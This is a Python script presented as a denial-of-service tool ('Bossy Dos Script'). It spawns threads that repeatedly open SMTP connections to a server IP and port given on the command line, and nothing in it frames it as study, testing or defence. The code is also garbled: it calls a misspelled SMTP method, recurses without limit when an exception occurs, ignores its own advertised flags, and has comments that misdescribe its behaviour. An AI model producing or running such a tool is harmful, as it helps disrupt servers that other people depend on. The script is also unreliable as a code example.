#!/usr/bin/python3
import smtplib,sys,time,os,random
from threading import Thread

print (''' \033[91mBossy Dos Script v.1 https://www.aspartim.org/
  ____  _____ ____   ____  ____  ______  ____  ___ ___ 
 /    |/ ___/|    \ /    ||    \|      ||    ||   |   |
|  o  (   \_ |  o  )  o  ||  D  )      | |  | | _   _ |
|     |\__  ||   _/|     ||    /|_|  |_| |  | |  \_/  |
|  _  |/  \ ||  |  |  _  ||    \  |  |   |  | |   |   |
|  |  |\    ||  |  |  |  ||  .  \ |  |   |  | |   |   |
|__|__| \___||__|  |__|__||__|\_| |__|  |____||___|___|
                                                       
                                \n
	usage : python3 bossyv1.0.py [-u] [-p] [-v]
	-h : help
	-u : server ip
	-p : port default 80
	-v : turbo default 200 \033[0m''')

time.sleep(2)
try:
	os.system("clear")
except:
	os.system("cls")
def attack(host, port):
 #Print The Server And Port Creads
 try:
     for x in range(int(sys.argv[3])):
        #We Wait for 1 Sec
        time.sleep(1)
        #This Is Where We Request SMTP
        s = smtplib.SMTP(host, port)
        #Phase 2
        s.elho()
        #If Phase To Was A Success This Means Server Uses SMTP
        s.starttls()
        #We Tell The Client That The Server Rejected Which Means That It uses SMTP
        print("- Server Rejected Frisk Packet",time.ctime(),"".format(host, port))
 except:
     attack(sys.argv[1],sys.argv[2])
def Main():
    try:
        for alex in range(int(sys.argv[3])):
            f1 = Thread(target=attack, args=(sys.argv[1],sys.argv[2]))
            f2 = Thread(target=attack, args=(sys.argv[1],sys.argv[2]))
            f3 = Thread(target=attack, args=(sys.argv[1],sys.argv[2]))
            f4 = Thread(target=attack, args=(sys.argv[1],sys.argv[2]))
            f5 = Thread(target=attack, args=(sys.argv[1],sys.argv[2]))
            f1.start()
            f2.start()
            f3.start()
            f4.start()
            f5.start()
    except RuntimeError as error:
        print(time.ctime(),"+ SENT FRISK CURRENTLY ATTACKING".format(sys.argv[1], sys.argv[2]))
if __name__ == "__main__":
   # while True:
    #    try:
     #       while True:
      #          main()
       # except:
        #        main()
    Main()



